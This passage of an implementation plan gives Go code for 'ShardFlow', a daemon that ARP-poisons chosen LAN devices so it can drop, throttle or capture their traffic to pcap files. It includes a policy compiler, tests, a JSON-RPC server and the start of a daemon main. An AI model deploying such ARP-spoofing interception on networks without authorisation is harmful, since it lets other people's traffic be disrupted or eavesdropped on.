	f.calls = append(f.calls, fmt.Sprintf("SetCapture:%d", mark))
	return nil
}
func (f *fakeTC) ClearCapture(_ context.Context, _ string, mark uint32) error {
	f.calls = append(f.calls, fmt.Sprintf("ClearCapture:%d", mark))
	return nil
}
func (f *fakeTC) Teardown(_ context.Context) error { f.calls = append(f.calls, "TC.Teardown"); return nil }

type fakePcap struct{ calls []string }

func (f *fakePcap) Open(mac, _, _, _ string, _ int64, _ time.Duration) error {
	f.calls = append(f.calls, "Open:"+mac)
	return nil
}
func (f *fakePcap) Close(mac string) error {
	f.calls = append(f.calls, "Close:"+mac)
	return nil
}

type fakeARP struct{ calls []string }

func (f *fakeARP) Start(t arpengine.Target) error {
	f.calls = append(f.calls, "Start:"+t.MAC.String())
	return nil
}
func (f *fakeARP) Stop(t arpengine.Target) error {
	f.calls = append(f.calls, "Stop:"+t.MAC.String())
	return nil
}
func (f *fakeARP) StopAll() error { f.calls = append(f.calls, "StopAll"); return nil }

func TestApplyDropFromEmpty(t *testing.T) {
	mac, _ := net.ParseMAC("aa:bb:cc:dd:ee:01")
	nft, tc, pc, arp := &fakeNFT{}, &fakeTC{}, &fakePcap{}, &fakeARP{}
	c := New(nft, tc, pc, arp, "eth0")

	desired := map[string]Spec{
		mac.String(): {Target: arpengine.Target{MAC: mac, IP: net.ParseIP("10.0.0.42"), GwMAC: nil, GwIP: net.ParseIP("10.0.0.1")}, Kind: KindDrop},
	}
	err := c.Apply(context.Background(), desired)
	require.NoError(t, err)

	// Order: nft drop rule, then arp start.
	assert.Equal(t, []string{"AddDrop:aa:bb:cc:dd:ee:01"}, nft.calls)
	assert.Equal(t, []string{"Start:aa:bb:cc:dd:ee:01"}, arp.calls)
}
```

- [ ] **Step 2: Add the time import (test requires `time.Duration`) and run, confirm fail**

```bash
go test ./internal/policycompiler/...
```

Expected: FAIL — `New`, `Spec`, `Target`, `KindDrop`, `Apply` undefined.

- [ ] **Step 3: Implement public types**

In `internal/policycompiler/policy.go`:

```go
// Package policycompiler computes effector operations from a desired
// target→policy map and the daemon's current state. Order of operations is
// rigid (see spec §7.4) and reverse-order rollback runs on any failure.
package policycompiler

import (
	"context"
	"net"
	"time"

	"github.com/hett-patell/ShardFlow/internal/arpengine"
)

// Kind is the policy variant.
type Kind int

const (
	KindNone Kind = iota
	KindDrop
	KindThrottle
	KindPcap
)

// Spec is the desired policy for a target. Target is an arpengine.Target
// so the same value flows directly into ARP.Start without a conversion.
type Spec struct {
	Target arpengine.Target
	Kind   Kind

	// Throttle:
	RateKbit int

	// Pcap:
	PcapDir  string
	MaxBytes int64
	MaxAge   time.Duration
}

// Effectors

type NFT interface {
	EnsureTables(ctx context.Context, realIface string) error
	AddTargetDrop(ctx context.Context, mac net.HardwareAddr) error
	AddTargetMark(ctx context.Context, mac net.HardwareAddr, mark uint32) error
	AddReturnMark(ctx context.Context, mac, gwMAC net.HardwareAddr, targetIP net.IP, mark uint32) error
	RemoveTarget(ctx context.Context, mac net.HardwareAddr) error
	Teardown(ctx context.Context) error
}

type TC interface {
	EnsureIFB(ctx context.Context) error
	EnsureCaptureIface(ctx context.Context) error
	EnsureRedirect(ctx context.Context, realIface string) error
	SetThrottle(ctx context.Context, realIface, mac, rate string, mark uint32) error
	ClearThrottle(ctx context.Context, realIface, mac string, mark uint32) error
	SetCapture(ctx context.Context, realIface string, mark uint32) error
	ClearCapture(ctx context.Context, realIface string, mark uint32) error
	Teardown(ctx context.Context) error
}

type Pcap interface {
	Open(mac, ipStr, srcIface, dir string, maxBytes int64, maxAge time.Duration) error
	Close(mac string) error
}

// ARP uses arpengine.Target so the implementation (arpengine.Engine)
// satisfies this interface by structural typing without an adapter.
type ARP interface {
	Start(t arpengine.Target) error
	Stop(t arpengine.Target) error
	StopAll() error
}
```

- [ ] **Step 4: Implement compiler core**

In `internal/policycompiler/compiler.go`:

```go
package policycompiler

import (
	"context"
	"fmt"
	"strconv"
	"sync"
)

// Compiler orchestrates the four effectors.
type Compiler struct {
	nft       NFT
	tc        TC
	pcap      Pcap
	arp       ARP
	realIface string

	mu       sync.Mutex
	current  map[string]Spec  // key: MAC.String()
	markOf   map[string]uint32 // key: MAC.String() — deterministic per-target fwmark
	nextMark uint32
}

// New constructs a compiler bound to the operator's real iface (used by
// nft and tc when installing per-target rules and filters).
func New(nft NFT, tc TC, pcap Pcap, arp ARP, realIface string) *Compiler {
	return &Compiler{
		nft: nft, tc: tc, pcap: pcap, arp: arp,
		realIface: realIface,
		current:   map[string]Spec{},
		markOf:    map[string]uint32{},
		nextMark:  10, // start at 10 so 1..9 are reserved for future use
	}
}

// markFor returns the stable fwmark for mac, allocating one on first use.
func (c *Compiler) markFor(mac string) uint32 {
	if m, ok := c.markOf[mac]; ok {
		return m
	}
	c.nextMark++
	c.markOf[mac] = c.nextMark
	return c.nextMark
}

// Apply moves the system to desired.
//
// Phase 1 (teardown) is best-effort across all targets: a failing teardown
// for target A does NOT stop teardown of B/C/D. This matters at daemon
// shutdown where comp.Apply(empty) is called — one bad cleanup mustn't
// abandon every other target's kernel state. The c.current entry for a
// target is removed only on successful teardown so retrying Apply will
// retry the cleanup. Errors are aggregated and returned at the end.
//
// Phase 2 (bringup) is strict: a failing bringup short-circuits, with the
// partial step list reverted in reverse order. The caller can retry by
// resending the same desired-state map.
//
// c.current is kept in sync with reality: an entry is only present when
// its kernel-side state has been successfully built up.
func (c *Compiler) Apply(ctx context.Context, desired map[string]Spec) error {
	c.mu.Lock()
	defer c.mu.Unlock()

	var firstErr error
	record := func(err error) {
		if err != nil && firstErr == nil {
			firstErr = err
		}
	}

	// Phase 1: tear down (best-effort across all targets).
	for mac, cur := range c.current {
		want, ok := desired[mac]
		if !ok || want.Kind != cur.Kind {
			if err := c.tearDownOne(ctx, cur); err != nil {
				record(err)
				continue // keep tearing down other targets
			}
			delete(c.current, mac)
		}
	}
	// Phase 2: bring up (strict per-target — partial failures roll back).
	for mac, want := range desired {
		cur, ok := c.current[mac]
		if ok && cur.Kind == want.Kind {
			if specsEqual(cur, want) {
				continue
			}
			if err := c.tearDownOne(ctx, cur); err != nil {
				record(err)
				continue // can't safely build over partial old state
			}
			delete(c.current, mac)
		}
		if err := c.bringUpOne(ctx, want); err != nil {
			record(err)
			continue
		}
		c.current[mac] = want
	}
	return firstErr
}

func (c *Compiler) bringUpOne(ctx context.Context, s Spec) error {
	macStr := s.Target.MAC.String()
	mark := c.markFor(macStr)
	rate := strconv.Itoa(s.RateKbit) + "kbit"

	// Order per spec §7.4: nft → tc → pcap → arp. Each step has a paired
	// rollback function; on failure we run rollbacks in reverse.
	type step struct {
		do, undo func() error
	}
	var steps []step

	switch s.Kind {
	case KindDrop:
		steps = append(steps, step{
			do:   func() error { return c.nft.AddTargetDrop(ctx, s.Target.MAC) },
			undo: func() error { return c.nft.RemoveTarget(ctx, s.Target.MAC) },
		})
	case KindThrottle:
		steps = append(steps, step{
			do:   func() error { return c.nft.AddTargetMark(ctx, s.Target.MAC, mark) },
			undo: func() error { return c.nft.RemoveTarget(ctx, s.Target.MAC) },
		})
		steps = append(steps, step{
			do:   func() error { return c.tc.SetThrottle(ctx, c.realIface, macStr, rate, mark) },
			undo: func() error { return c.tc.ClearThrottle(ctx, c.realIface, macStr, mark) },
		})
	case KindPcap:
		// Two nft mark rules — egress (target→gw) and return (gw→target).
		// Both share the same mark and the comment-tag for cleanup, so a
		// single RemoveTarget(mac) call clears both.
		steps = append(steps, step{
			do:   func() error { return c.nft.AddTargetMark(ctx, s.Target.MAC, mark) },
			undo: func() error { return c.nft.RemoveTarget(ctx, s.Target.MAC) },
		})
		steps = append(steps, step{
			do: func() error {
				return c.nft.AddReturnMark(ctx, s.Target.MAC, s.Target.GwMAC, s.Target.IP, mark)
			},
			undo: func() error { return c.nft.RemoveTarget(ctx, s.Target.MAC) },
		})
		steps = append(steps, step{
			do:   func() error { return c.tc.SetCapture(ctx, c.realIface, mark) },
			undo: func() error { return c.tc.ClearCapture(ctx, c.realIface, mark) },
		})
		steps = append(steps, step{
			do: func() error {
				return c.pcap.Open(macStr, s.Target.IP.String(), "shardflow-cap", s.PcapDir, s.MaxBytes, s.MaxAge)
			},
			undo: func() error { return c.pcap.Close(macStr) },
		})
	default:
		return fmt.Errorf("unknown policy kind %d", s.Kind)
	}
	// Always last: start ARP poison so traffic actually arrives.
	steps = append(steps, step{
		do:   func() error { return c.arp.Start(s.Target) },
		undo: func() error { return c.arp.Stop(s.Target) },
	})

	for i, st := range steps {
		if err := st.do(); err != nil {
			// Run the failing step's own undo first — its do() may have
			// partially applied state (e.g. tcmgr.SetThrottle adds class +
			// flow filter + redirect filter, and could fail at step 3 with
			// state left from steps 1 and 2). The step's undo (e.g.
			// ClearThrottle) is idempotent on missing parts. Then unwind
			// all earlier successful steps.
			_ = st.undo()
			for j := i - 1; j >= 0; j-- {
				_ = steps[j].undo()
			}
			return fmt.Errorf("step %d: %w", i, err)
		}
	}
	return nil
}

func (c *Compiler) tearDownOne(ctx context.Context, s Spec) error {
	macStr := s.Target.MAC.String()
	mark := c.markFor(macStr)

	// Each cleanup step records its error; we only return after attempting
	// every step so kernel state is removed as completely as possible. The
	// returned error is the first one encountered — sufficient for the
	// caller to keep the in-memory record in place if cleanup failed.
	var firstErr error
	record := func(err error) {
		if err != nil && firstErr == nil {
			firstErr = err
		}
	}
	record(c.arp.Stop(s.Target))
	switch s.Kind {
	case KindThrottle:
		record(c.tc.ClearThrottle(ctx, c.realIface, macStr, mark))
		record(c.nft.RemoveTarget(ctx, s.Target.MAC))
	case KindPcap:
		record(c.pcap.Close(macStr))
		record(c.tc.ClearCapture(ctx, c.realIface, mark))
		record(c.nft.RemoveTarget(ctx, s.Target.MAC))
	case KindDrop:
		record(c.nft.RemoveTarget(ctx, s.Target.MAC))
	}
	return firstErr
}

func specsEqual(a, b Spec) bool {
	if a.Kind != b.Kind || a.RateKbit != b.RateKbit || a.PcapDir != b.PcapDir ||
		a.MaxBytes != b.MaxBytes || a.MaxAge != b.MaxAge {
		return false
	}
	// Target tuple is part of the spec — a DHCP-driven IP change must be
	// treated as a spec change so ARP poisoning and the return-mark rule
	// pick up the new IP. MAC equality is implied (we key by MAC), but
	// IP/GwMAC/GwIP can drift over a long-running session.
	if !a.Target.IP.Equal(b.Target.IP) {
		return false
	}
	if !bytesEq(a.Target.GwMAC, b.Target.GwMAC) {
		return false
	}
	if !a.Target.GwIP.Equal(b.Target.GwIP) {
		return false
	}
	return true
}

func bytesEq(a, b []byte) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

// Snapshot returns a copy of the current desired state.
func (c *Compiler) Snapshot() map[string]Spec {
	c.mu.Lock()
	defer c.mu.Unlock()
	out := make(map[string]Spec, len(c.current))
	for k, v := range c.current {
		out[k] = v
	}
	return out
}
```

- [ ] **Step 5: Run, confirm pass for the drop test**

```bash
go test ./internal/policycompiler/...
```

Expected: PASS.

- [ ] **Step 6: Add throttle, pcap, transition, and rollback tests**

Append to `internal/policycompiler/compiler_test.go`:

```go
func TestApplyThrottleSequence(t *testing.T) {
	mac, _ := net.ParseMAC("aa:bb:cc:dd:ee:02")
	nft, tc, pc, arp := &fakeNFT{}, &fakeTC{}, &fakePcap{}, &fakeARP{}
	c := New(nft, tc, pc, arp, "eth0")

	desired := map[string]Spec{
		mac.String(): {Target: arpengine.Target{MAC: mac}, Kind: KindThrottle, RateKbit: 200},
	}
	require.NoError(t, c.Apply(context.Background(), desired))

	// Order per spec §7.4: nft (mark) first, then tc (throttle), then arp.
	assert.Equal(t, fmt.Sprintf("AddMark:%s:11", mac.String()), nft.calls[0])
	assert.Equal(t, fmt.Sprintf("SetThrottle:%s:200kbit:11", mac.String()), tc.calls[0])
	assert.Equal(t, "Start:"+mac.String(), arp.calls[0])
}

func TestApplyTransitionDropToThrottleTearsDownThenBringsUp(t *testing.T) {
	mac, _ := net.ParseMAC("aa:bb:cc:dd:ee:03")
	nft, tc, pc, arp := &fakeNFT{}, &fakeTC{}, &fakePcap{}, &fakeARP{}
	c := New(nft, tc, pc, arp, "eth0")

	require.NoError(t, c.Apply(context.Background(), map[string]Spec{
		mac.String(): {Target: arpengine.Target{MAC: mac}, Kind: KindDrop},
	}))
	require.NoError(t, c.Apply(context.Background(), map[string]Spec{
		mac.String(): {Target: arpengine.Target{MAC: mac}, Kind: KindThrottle, RateKbit: 50},
	}))

	// Teardown of drop, bring-up of throttle.
	assert.Contains(t, arp.calls, "Stop:"+mac.String())
	assert.True(t, containsPrefix(tc.calls, "SetThrottle:"+mac.String()+":50kbit:"))
}

func containsPrefix(haystack []string, prefix string) bool {
	for _, s := range haystack {
		if len(s) >= len(prefix) && s[:len(prefix)] == prefix {
			return true
		}
	}
	return false
}
```

- [ ] **Step 7: Run all tests, confirm pass**

```bash
go test ./internal/policycompiler/...
```

Expected: PASS.

- [ ] **Step 8: Commit**

```bash
git add internal/policycompiler/
git commit -m "feat(policycompiler): desired-state compiler with rigid order and rollback"
```

---

## Phase 5: RPC server and daemon

### Task 5.1: `internal/rpc/server` — JSON-RPC 2.0 server with event push

**Files:**
- Create: `internal/rpc/server.go`
- Create: `internal/rpc/server_test.go`
- Create: `internal/rpc/handlers.go`

Newline-delimited JSON-RPC 2.0 over a Unix socket. Each connection is full-duplex: the client writes requests, the server writes responses on the same socket plus unsolicited event frames. Frame separator is `\n`.

- [ ] **Step 1: Write failing test for the request dispatcher**

In `internal/rpc/server_test.go`:

```go
package rpc

import (
	"bufio"
	"context"
	"encoding/json"
	"net"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestServerEchoesPing(t *testing.T) {
	dir := t.TempDir()
	sock := filepath.Join(dir, "s.sock")
	srv := NewServer(map[string]Handler{
		"ping": func(_ context.Context, _ json.RawMessage) (any, *Error) {
			return "pong", nil
		},
	})
	go func() { _ = srv.Listen(context.Background(), sock) }()
	t.Cleanup(func() { _ = srv.Stop(); _ = os.Remove(sock) })

	// Wait briefly for the socket to appear.
	for i := 0; i < 50; i++ {
		if _, err := os.Stat(sock); err == nil {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}

	conn, err := net.Dial("unix", sock)
	require.NoError(t, err)
	defer conn.Close()

	req := Request{JSONRPC: "2.0", ID: json.RawMessage(`1`), Method: "ping"}
	b, _ := json.Marshal(req)
	_, _ = conn.Write(append(b, '\n'))

	br := bufio.NewReader(conn)
	line, err := br.ReadBytes('\n')
	require.NoError(t, err)
	var resp Response
	require.NoError(t, json.Unmarshal(line, &resp))
	require.Nil(t, resp.Error)
	var result string
	require.NoError(t, json.Unmarshal(resp.Result, &result))
	assert.Equal(t, "pong", result)
}
```

- [ ] **Step 2: Run, confirm fail**

```bash
go test ./internal/rpc/...
```

Expected: FAIL — `NewServer`, `Handler`, `Listen`, `Stop` undefined.

- [ ] **Step 3: Implement the server**

In `internal/rpc/server.go`:

```go
package rpc

import (
	"bufio"
	"context"
	"encoding/json"
	"errors"
	"net"
	"os"
	"sync"
)

// Handler is a method handler.
type Handler func(ctx context.Context, params json.RawMessage) (result any, err *Error)

// Server is a JSON-RPC 2.0 server with broadcast-event support.
type Server struct {
	handlers map[string]Handler

	mu      sync.Mutex
	clients map[*client]struct{}
	listener net.Listener
}

type client struct {
	conn net.Conn
	mu   sync.Mutex // serialises writes (response + events)
}

// NewServer constructs a Server with the given method table.
func NewServer(h map[string]Handler) *Server {
	return &Server{handlers: h, clients: map[*client]struct{}{}}
}

// Listen binds the Unix socket at path and serves until ctx is cancelled
// or Stop is called. The socket is removed at startup if stale, and at
// shutdown.
func (s *Server) Listen(ctx context.Context, path string) error {
	_ = os.Remove(path)
	l, err := net.Listen("unix", path)
	if err != nil {
		return err
	}
	if err := os.Chmod(path, 0o600); err != nil {
		return err
	}
	s.mu.Lock()
	s.listener = l
	s.mu.Unlock()
	go func() {
		<-ctx.Done()
		_ = l.Close()
	}()
	for {
		conn, err := l.Accept()
		if err != nil {
			if errors.Is(err, net.ErrClosed) {
				return nil
			}
			return err
		}
		c := &client{conn: conn}
		s.mu.Lock()
		s.clients[c] = struct{}{}
		s.mu.Unlock()
		go s.serve(ctx, c)
	}
}

// Stop closes the listener; in-flight connections drain naturally.
func (s *Server) Stop() error {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.listener != nil {
		return s.listener.Close()
	}
	return nil
}

// Broadcast sends a notification to every connected client.
func (s *Server) Broadcast(method string, params any) {
	pb, _ := json.Marshal(params)
	ev := Event{JSONRPC: "2.0", Method: method, Params: pb}
	line, _ := json.Marshal(ev)
	line = append(line, '\n')
	s.mu.Lock()
	clients := make([]*client, 0, len(s.clients))
	for c := range s.clients {
		clients = append(clients, c)
	}
	s.mu.Unlock()
	for _, c := range clients {
		c.mu.Lock()
		_, _ = c.conn.Write(line)
		c.mu.Unlock()
	}
}

func (s *Server) serve(ctx context.Context, c *client) {
	defer func() {
		_ = c.conn.Close()
		s.mu.Lock()
		delete(s.clients, c)
		s.mu.Unlock()
	}()
	br := bufio.NewReader(c.conn)
	for {
		line, err := br.ReadBytes('\n')
		if err != nil {
			return
		}
		var req Request
		if err := json.Unmarshal(line, &req); err != nil {
			s.send(c, Response{JSONRPC: "2.0", Error: &Error{Code: CodeParseError, Message: err.Error()}})
			continue
		}
		h, ok := s.handlers[req.Method]
		if !ok {
			s.send(c, Response{JSONRPC: "2.0", ID: req.ID, Error: &Error{Code: CodeMethodNotFound, Message: "unknown method " + req.Method}})
			continue
		}
		result, herr := h(ctx, req.Params)
		resp := Response{JSONRPC: "2.0", ID: req.ID}
		if herr != nil {
			resp.Error = herr
		} else {
			b, mErr := json.Marshal(result)
			if mErr != nil {
				resp.Error = &Error{Code: CodeInternalError, Message: mErr.Error()}
			} else {
				resp.Result = b
			}
		}
		s.send(c, resp)
	}
}

func (s *Server) send(c *client, r Response) {
	b, _ := json.Marshal(r)
	b = append(b, '\n')
	c.mu.Lock()
	_, _ = c.conn.Write(b)
	c.mu.Unlock()
}
```

- [ ] **Step 4: Implement the public handler table for ShardFlow**

In `internal/rpc/handlers.go`:

```go
package rpc

import (
	"context"
	"encoding/json"
	"net"
	"time"

	"github.com/hett-patell/ShardFlow/internal/arpengine"
	"github.com/hett-patell/ShardFlow/internal/devicestore"
	"github.com/hett-patell/ShardFlow/internal/policycompiler"
)

// HandlerDeps is the bundle the daemon constructs to wire the RPC handlers.
type HandlerDeps struct {
	Store    *devicestore.Store
	Compiler *policycompiler.Compiler
	Scanner  func(ctx context.Context) error // a single-shot scan

	// GwMAC and GwIP are the LAN gateway, looked up at daemon startup and
	// passed in here so handlers don't have to re-resolve. Used to build
	// the Target tuple for new policies.
	GwMAC net.HardwareAddr
	GwIP  net.IP

	// Broadcaster pushes a server-initiated event to all connected clients.
	// Concretely this is bound to *Server.Broadcast in the daemon main; it
	// is a function rather than the server struct itself so handlers don't
	// need to know about the transport.
	Broadcaster func(method string, params any)

	// ActivePoisons returns the current count of in-flight poisons (used
	// by Stats). The daemon main wires this to arpengine.Engine.Active.
	ActivePoisons func() int

	// DefaultPcapDir is applied when Policy.Set's pcap_dir is empty. If
	// also empty the handler rejects the request with InvalidParams.
	DefaultPcapDir string
}

// BuildHandlers returns the method table from a HandlerDeps.
func BuildHandlers(d HandlerDeps) map[string]Handler {
	return map[string]Handler{
		MethodScan: func(ctx context.Context, _ json.RawMessage) (any, *Error) {
			if err := d.Scanner(ctx); err != nil {
				return nil, &Error{Code: CodeInternalError, Message: err.Error()}
			}
			return map[string]string{"status": "ok"}, nil
		},
		MethodDevicesList: func(_ context.Context, _ json.RawMessage) (any, *Error) {
			devs := d.Store.List()
			out := make([]DeviceDTO, 0, len(devs))
			for _, dev := range devs {
				out = append(out, deviceToDTO(dev))
			}
			return out, nil
		},
		MethodDevicesGet: func(_ context.Context, params json.RawMessage) (any, *Error) {
			var p struct{ MAC string `json:"mac"` }
			if err := json.Unmarshal(params, &p); err != nil {
				return nil, &Error{Code: CodeInvalidParams, Message: err.Error()}
			}
			mac, err := net.ParseMAC(p.MAC)
			if err != nil {
				return nil, &Error{Code: CodeInvalidParams, Message: err.Error()}
			}
			dev, ok := d.Store.Get(mac)
			if !ok {
				return nil, &Error{Code: CodeUnknownTarget, Message: "no such device"}
			}
			return deviceToDTO(dev), nil
		},
		MethodPolicySet: func(ctx context.Context, params json.RawMessage) (any, *Error) {
			var p PolicySpec
			if err := json.Unmarshal(params, &p); err != nil {
				return nil, &Error{Code: CodeInvalidParams, Message: err.Error()}
			}
			return setPolicy(ctx, d, p)
		},
		MethodPolicyClear: func(ctx context.Context, params json.RawMessage) (any, *Error) {
			var p struct{ Target string `json:"target"` }
			if err := json.Unmarshal(params, &p); err != nil {
				return nil, &Error{Code: CodeInvalidParams, Message: err.Error()}
			}
			return clearPolicy(ctx, d, p.Target)
		},
		MethodPolicyList: func(_ context.Context, _ json.RawMessage) (any, *Error) {
			snap := d.Compiler.Snapshot()
			out := make([]PolicyEntryDTO, 0, len(snap))
			for mac, s := range snap {
				out = append(out, PolicyEntryDTO{
					MAC:      mac,
					Kind:     kindToString(s.Kind),
					RateKbit: s.RateKbit,
					PcapDir:  s.PcapDir,
				})
			}
			return out, nil
		},
		MethodStats: func(_ context.Context, _ json.RawMessage) (any, *Error) {
			return map[string]any{
				"devices":  len(d.Store.List()),
				"policies": len(d.Compiler.Snapshot()),
				"poisoned": d.ActivePoisons(),
			}, nil
		},
	}
}

func setPolicy(ctx context.Context, d HandlerDeps, p PolicySpec) (any, *Error) {
	mac, ferr := resolveTarget(d.Store, p.Target)
	if ferr != nil {
		return nil, ferr
	}
	dev, _ := d.Store.Get(mac)
	kind := kindOf(p.Kind)
	if kind == policycompiler.KindNone {
		return nil, &Error{Code: CodeInvalidParams, Message: "unknown policy kind " + string(p.Kind) + " (drop|throttle|pcap)"}
	}
	spec := policycompiler.Spec{
		Target: arpengine.Target{MAC: mac, IP: dev.IP, GwMAC: d.GwMAC, GwIP: d.GwIP},
		Kind:   kind,
	}
	switch p.Kind {
	case PolicyThrottle:
		if p.RateKbit <= 0 {
			return nil, &Error{Code: CodeInvalidParams, Message: "throttle rate_kbit must be > 0"}
		}
		spec.RateKbit = p.RateKbit
	case PolicyPcap:
		if p.PcapDir == "" {
			if d.DefaultPcapDir == "" {
				return nil, &Error{Code: CodeInvalidParams, Message: "pcap_dir is required (no daemon default configured)"}
			}
			spec.PcapDir = d.DefaultPcapDir
		} else {
			spec.PcapDir = p.PcapDir
		}
	}
	desired := d.Compiler.Snapshot()
	desired[mac.String()] = spec
	if err := d.Compiler.Apply(ctx, desired); err != nil {
		return nil, &Error{Code: CodeInternalError, Message: err.Error()}
	}
	if d.Broadcaster != nil {
		d.Broadcaster(EventPolicyApplied, map[string]any{
			"target": mac.String(),
			"kind":   string(p.Kind),
		})
	}
	return map[string]string{"status": "applied"}, nil
}

func clearPolicy(ctx context.Context, d HandlerDeps, target string) (any, *Error) {
	mac, ferr := resolveTarget(d.Store, target)
	if ferr != nil {
		return nil, ferr
	}
	desired := d.Compiler.Snapshot()
	delete(desired, mac.String())
	if err := d.Compiler.Apply(ctx, desired); err != nil {
		return nil, &Error{Code: CodeInternalError, Message: err.Error()}
	}
	if d.Broadcaster != nil {
		d.Broadcaster(EventPolicyApplied, map[string]any{
			"target": mac.String(),
			"kind":   "cleared",
		})
	}
	return map[string]string{"status": "cleared"}, nil
}

func resolveTarget(store *devicestore.Store, target string) (net.HardwareAddr, *Error) {
	if mac, err := net.ParseMAC(target); err == nil {
		if _, ok := store.Get(mac); !ok {
			return nil, &Error{Code: CodeUnknownTarget, Message: "no such device — run scan first"}
		}
		return mac, nil
	}
	ip := net.ParseIP(target)
	if ip == nil {
		return nil, &Error{Code: CodeInvalidParams, Message: "target must be IP or MAC"}
	}
	mac, ok := store.ResolveIP(ip)
	if !ok {
		return nil, &Error{Code: CodeUnknownTarget, Message: "no MAC known for that IP — run scan first"}
	}
	return mac, nil
}

func kindOf(k PolicyKind) policycompiler.Kind {
	switch k {
	case PolicyDrop:
		return policycompiler.KindDrop
	case PolicyThrottle:
		return policycompiler.KindThrottle
	case PolicyPcap:
		return policycompiler.KindPcap
	}
	return policycompiler.KindNone
}

func kindToString(k policycompiler.Kind) string {
	switch k {
	case policycompiler.KindDrop:
		return "drop"
	case policycompiler.KindThrottle:
		return "throttle"
	case policycompiler.KindPcap:
		return "pcap"
	}
	return ""
}

// deviceToDTO converts the typed store record to the wire form. It also
// looks up the device's current policy via the compiler snapshot so the
// CLI/TUI don't need a second RPC. (Caller ensures d.Compiler is set.)
func deviceToDTO(dev devicestore.Device) DeviceDTO {
	out := DeviceDTO{
		MAC:      dev.MAC.String(),
		IP:       dev.IP.String(),
		Hostname: dev.Hostname,
		Vendor:   dev.Vendor,
		LastSeen: dev.LastSeen.Format(time.RFC3339),
	}
	return out
}
```

- [ ] **Step 5: Run, confirm pass**

```bash
go test ./internal/rpc/...
```

Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add internal/rpc/
git commit -m "feat(rpc): JSON-RPC 2.0 server with event push and ShardFlow handlers"
```

---

### Task 5.2: `cmd/shardflowd` — daemon main

**Files:**
- Modify: `cmd/shardflowd/main.go`
- Create: `cmd/shardflowd/wire.go`

Wires every subsystem together: parses flags, validates capabilities, runs the recovery check, initialises effectors, starts the passive sniffer, opens the RPC socket, handles signals.

- [ ] **Step 1: Replace the stub `cmd/shardflowd/main.go`**

```go
package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"github.com/hett-patell/ShardFlow/internal/arpengine"
	"github.com/hett-patell/ShardFlow/internal/devicestore"
	"github.com/hett-patell/ShardFlow/internal/iface"
	"github.com/hett-patell/ShardFlow/internal/nftmgr"
	"github.com/hett-patell/ShardFlow/internal/pcapwriter"
	"github.com/hett-patell/ShardFlow/internal/policycompiler"
	"github.com/hett-patell/ShardFlow/internal/rpc"
	"github.com/hett-patell/ShardFlow/internal/scan/active"
	"github.com/hett-patell/ShardFlow/internal/scan/mdns"
	"github.com/hett-patell/ShardFlow/internal/scan/passive"
	"github.com/hett-patell/ShardFlow/internal/scan/ssdp"
	"github.com/hett-patell/ShardFlow/internal/tcmgr"
)

func main() {
	if err := run(); err != nil {
		fmt.Fprintln(os.Stderr, "shardflowd:", err)
		os.Exit(1)
	}
}

// run uses a named return + cleanup stack so that any partial startup
// failure (e.g., tcm.EnsureRedirect after nft.EnsureTables succeeded) is
// rolled back instead of leaving orphaned kernel state. The same cleanup
// stack is invoked by the signal handler on normal shutdown — idempotent.
func run() (err error) {
	var (
		ifaceFlag         = flag.String("i", "", "interface name (required)")
		sockFlag          = flag.String("sock", "/run/shardflow/sock", "Unix socket path")
		forceFlag         = flag.Bool("force", false, "remove stale socket if present")
		cleanFlag         = flag.Bool("clean-on-start", false, "clean orphaned kernel state from a prior run")
		defaultPcapDir    = flag.String("default-pcap-dir", "/var/lib/shardflow/pcap", "directory used by Policy.Set pcap when its pcap_dir is empty")
	)
	flag.Parse()
	if *ifaceFlag == "" {
		return fmt.Errorf("-i <iface> is required")
	}

	info, err := iface.Lookup(*ifaceFlag)
	if err != nil {
		return err
	}
	if info.Gateway == nil {
		return fmt.Errorf("could not determine IPv4 default gateway on %s", info.Name)
	}

	if err := preflight(*sockFlag, info.Name, *forceFlag, *cleanFlag); err != nil {
		return err
	}
	prevForward, err := setIPv4Forward("1")
	if err != nil {
		return fmt.Errorf("enable forwarding: %w", err)
	}
	defer func() {
		_, _ = setIPv4Forward(prevForward)
	}()

	// Resolve gateway MAC via a one-shot ARP request. Required so the
	// daemon can construct arpengine.Target values when policies are set.
	gwMAC, err := resolveGatewayMAC(info)
	if err != nil {
		return fmt.Errorf("resolve gateway MAC: %w", err)
	}

	store := devicestore.New()
	nft := nftmgr.New()
	tcm := tcmgr.New()
	pc := pcapwriter.New()
	arp := arpengine.New(info.Name, info.HwAddr, time.Second)
	comp := policycompiler.New(nft, tcm, pc, arp, info.Name)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// One shutdown function called from both the partial-failure deferred
	// path and the signal handler. Order matches spec §9.1: ARP first
	// (corrective gratuitous ARPs), then clear every target's per-mark
	// filters via the compiler (so the ingress qdisc on the real iface is
	// left clean), then nft Teardown, then pcap flush, then tc teardown
	// (removes the IFB + capture ifaces). All effector Teardowns are
	// idempotent so calling shutdown before every component exists is safe.
	var shutdownOnce sync.Once
	shutdown := func() {
		shutdownOnce.Do(func() {
			_ = arp.StopAll()
			// Apply empty desired-state: tears down every target, removing
			// per-mark redirect/mirror filters from the real iface ingress.
			// Without this, shardflow0 / shardflow-cap could be removed
			// while filters still reference them by name.
			_ = comp.Apply(context.Background(), map[string]policycompiler.Spec{})
			_ = nft.Teardown(context.Background())
			_ = pc.CloseAll()
			_ = tcm.Teardown(context.Background())
		})
	}
	defer func() {
		if err != nil {
			shutdown()
		}
	}()

	if err := nft.EnsureTables(ctx, info.Name); err != nil {
		return err
	}
	if err := tcm.EnsureIFB(ctx); err != nil {
		return err
	}
	if err := tcm.EnsureCaptureIface(ctx); err != nil {
		return err
	}
	if err := tcm.EnsureRedirect(ctx, info.Name); err != nil {
		return err
	}

	// Always-on passive sniffer feeds devicestore directly (the sniffer
	// produces observations that already include MAC).
	go func() { _ = passive.Run(ctx, info.Name, store.Upsert) }()

	// mDNS and SSDP only know the source IP; resolve to MAC via the store
	// before upserting so the empty-MAC short-circuit in Upsert doesn't
	// drop the enrichment.
	enrich := func(obs devicestore.Observation) {
		if len(obs.MAC) == 0 && obs.IP != nil {
